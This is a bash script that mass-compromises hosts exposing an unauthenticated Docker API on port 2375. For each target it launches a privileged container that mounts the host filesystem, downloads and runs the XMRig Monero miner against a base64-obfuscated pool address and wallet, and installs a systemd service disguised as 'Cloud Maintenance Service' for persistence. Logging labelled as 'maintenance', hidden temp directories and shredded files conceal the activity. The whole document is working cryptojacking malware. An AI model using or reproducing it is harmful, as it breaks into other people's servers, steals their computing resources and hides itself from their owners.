
#!/bin/bash
set -euo pipefail

# ===== Configuration =====
readonly DEPLOYMENT_TOKEN="$(echo "NDN5TDd6VlV2RFBqZkJ1RVp6b0xjUFR1dkY1QnY5V1BKNWRHd3RiYkhBcHdTd25FVGtndmVkMkRabVhlaTZCamh5NXZaM21qblpiaFZidEhrSE1ia3k3ZFZNdVZ0U3IK=" | base64 -d)"
readonly TELEMETRY_SERVER="$(echo "Z3VsZi5tb25lcm9vY2Vhbi5zdHJlYW06MTAxMjgK" | base64 -d)"
readonly LOG_FILE="/var/log/cloud_init.log"
readonly TMP_DIR="/tmp/.$(date +%s | sha256sum | cut -c1-8)"

# ===== Cleanup Function =====
cleanup() {
    rm -rf "${TMP_DIR}" 2>/dev/null
    shred -u "/tmp/.modupdate.tar.gz" "/tmp/.modconf.json" 2>/dev/null
}
trap cleanup EXIT

# ===== Docker API Check =====
check_docker_api() {
    if ! curl -s --connect-timeout 3 "http://$1:2375/version" | grep -q "ApiVersion"; then
        echo "[ERROR] Docker API unreachable on $1" >> "$LOG_FILE"
        return 1
    fi
    return 0
}

# ===== Payload Deployment =====
deploy_payload() {
    local target=$1
    local container_name="cloud_agent_$(date +%s)"

    if ! check_docker_api "$target"; then
        return 1
    fi

    docker -H "tcp://$target:2375" run \
        -d \
        --rm \
        --name "$container_name" \
        --cpu-quota 60000 \
        --memory 300M \
        --privileged \
        -v /:/host \
        alpine sh -c "
            # Create temp directory
            mkdir -p ${TMP_DIR}
            cd ${TMP_DIR}

            # Download and extract XMRig (MoneroOcean fork)
            wget -q --timeout=20 --tries=3 \
                https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64-compat.tar.gz \
                -O xmrig.tar.gz
            tar -xzf xmrig.tar.gz --strip-components=1

            # Configuration
            cat > config.json <<EOF
            {
                \"autosave\": true,
                \"cpu\": true,
                \"donate-level\": 0,
                \"pools\": [{
                    \"url\": \"${TELEMETRY_SERVER}\",
                    \"user\": \"${DEPLOYMENT_TOKEN}.\$(hostname | md5sum | cut -c1-8)\",
                    \"pass\": \"x\",
                    \"keepalive\": true
                }]
            }
            EOF

            # Throttled execution
            nohup nice -n 19 ./xmrig -c config.json \
                --max-cpu-usage=65 \
                --randomx-init=1 \
                --background \
                >> /host${LOG_FILE} 2>&1 &

            # Persistence via systemd (more reliable than cron)
            cat > /host/etc/systemd/system/cloud-agent.service <<EOF2
            [Unit]
            Description=Cloud Maintenance Service
            [Service]
            ExecStart=/bin/sh -c \"cd ${TMP_DIR} && ./xmrig -c config.json\"
            Restart=always
            RestartSec=60
            [Install]
            WantedBy=multi-user.target
            EOF2

            systemctl --system daemon-reload >/dev/null 2>&1
            systemctl enable cloud-agent >/dev/null 2>&1
            systemctl start cloud-agent >/dev/null 2>&1

            # Cleanup
            rm -f xmrig.tar.gz
        " >/dev/null 2>&1

    echo "[SUCCESS] Payload deployed to ${target} (Container: ${container_name})" >> "$LOG_FILE"
}

# ===== Main Execution =====
main() {
    echo "[INFO] Starting node maintenance at $(date)" >> "$LOG_FILE"
    
    # Read targets from stdin
    while read -r target; do
        deploy_payload "$target" &
        sleep $((RANDOM % 5 + 1))  # Randomized delay to avoid flooding
    done

    wait
    echo "[INFO] Maintenance completed at $(date)" >> "$LOG_FILE"
}

main
